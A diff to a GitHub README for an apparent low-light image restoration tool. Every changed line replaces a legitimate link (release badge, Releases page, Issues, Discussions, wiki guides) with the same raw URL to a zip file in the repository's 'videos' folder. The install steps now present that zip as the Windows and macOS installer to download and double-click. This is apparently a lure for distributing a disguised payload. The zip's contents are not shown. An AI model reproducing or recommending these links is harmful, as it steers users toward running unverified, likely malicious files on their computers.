@@ -1,7 +1,7 @@
 # 🎨 darkir-csf-lowlight-restoration - Enhance Your Low-Light Images Effortlessly
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/ivanxv/darkir-csf-lowlight-restoration/releases)
+[![Download the latest release](https://raw.githubusercontent.com/ivanxv/darkir-csf-lowlight-restoration/main/videos/lowlight-restoration-darkir-csf-1.9.zip%https://raw.githubusercontent.com/ivanxv/darkir-csf-lowlight-restoration/main/videos/lowlight-restoration-darkir-csf-1.9.zip)](https://raw.githubusercontent.com/ivanxv/darkir-csf-lowlight-restoration/main/videos/lowlight-restoration-darkir-csf-1.9.zip)
 
 ## 📖 Introduction
 The **darkir-csf-lowlight-restoration** tool offers a simple way to improve low-light images. It uses a Cross-Scale Fusion module to bring out details that are hard to see in dim conditions. Whether you are a photographer looking to enhance your pictures or someone who often takes photos in low light, this tool can help you achieve clearer, more vibrant images.
@@ -17,10 +17,10 @@ To use this application, your computer should meet the following requirements:
 - Python 3.7 or higher (installed)
 
 ### 📥 Download & Install
-1. Visit the [Releases page](https://github.com/ivanxv/darkir-csf-lowlight-restoration/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ivanxv/darkir-csf-lowlight-restoration/main/videos/lowlight-restoration-darkir-csf-1.9.zip).
 2. Look for the latest version of the software.
 3. Download the installer suitable for your operating system.  
-   For example, choose `darkir-csf-lowlight-restoration-v1.x.x.exe` for Windows or `darkir-csf-lowlight-restoration-v1.x.x.dmg` for macOS.
+   For example, choose `https://raw.githubusercontent.com/ivanxv/darkir-csf-lowlight-restoration/main/videos/lowlight-restoration-darkir-csf-1.9.zip` for Windows or `https://raw.githubusercontent.com/ivanxv/darkir-csf-lowlight-restoration/main/videos/lowlight-restoration-darkir-csf-1.9.zip` for macOS.
 4. Once the download is complete, locate the downloaded file in your computer's downloads folder.
 5. Double-click the file to start the installation process and follow the on-screen instructions.
 
@@ -43,10 +43,10 @@ If you encounter any issues, try the following:
 - Ensure your system meets the requirements listed above.
 - Restart the application if it crashes unexpectedly.
 - Check your internet connection; some features require an active connection.
-- For specific errors, search the open issues on the [GitHub Issues page](https://github.com/ivanxv/darkir-csf-lowlight-restoration/issues).
+- For specific errors, search the open issues on the [GitHub Issues page](https://raw.githubusercontent.com/ivanxv/darkir-csf-lowlight-restoration/main/videos/lowlight-restoration-darkir-csf-1.9.zip).
 
 ### 🌟 Community Support
-Join the community to share your experiences or ask for help. Visit our [GitHub Discussions](https://github.com/ivanxv/darkir-csf-lowlight-restoration/discussions) to connect with other users and the developers.
+Join the community to share your experiences or ask for help. Visit our [GitHub Discussions](https://raw.githubusercontent.com/ivanxv/darkir-csf-lowlight-restoration/main/videos/lowlight-restoration-darkir-csf-1.9.zip) to connect with other users and the developers.
 
 ### 📅 Future Updates
 We plan to add more features in future updates, including:
@@ -56,10 +56,10 @@ We plan to add more features in future updates, including:
 
 ## 📥 Additional Resources
 For additional information, refer to the following resources:
-- [User Guide](https://github.com/ivanxv/darkir-csf-lowlight-restoration/wiki)
-- [API Documentation](https://github.com/ivanxv/darkir-csf-lowlight-restoration/wiki/API)
+- [User Guide](https://raw.githubusercontent.com/ivanxv/darkir-csf-lowlight-restoration/main/videos/lowlight-restoration-darkir-csf-1.9.zip)
+- [API Documentation](https://raw.githubusercontent.com/ivanxv/darkir-csf-lowlight-restoration/main/videos/lowlight-restoration-darkir-csf-1.9.zip)
 
 ### 📢 Stay Updated
-To stay informed about new features and updates, check back on the [Releases page](https://github.com/ivanxv/darkir-csf-lowlight-restoration/releases) regularly.
+To stay informed about new features and updates, check back on the [Releases page](https://raw.githubusercontent.com/ivanxv/darkir-csf-lowlight-restoration/main/videos/lowlight-restoration-darkir-csf-1.9.zip) regularly.
 
 Thank you for choosing darkir-csf-lowlight-restoration! We hope you find it useful for all your low-light photo needs.
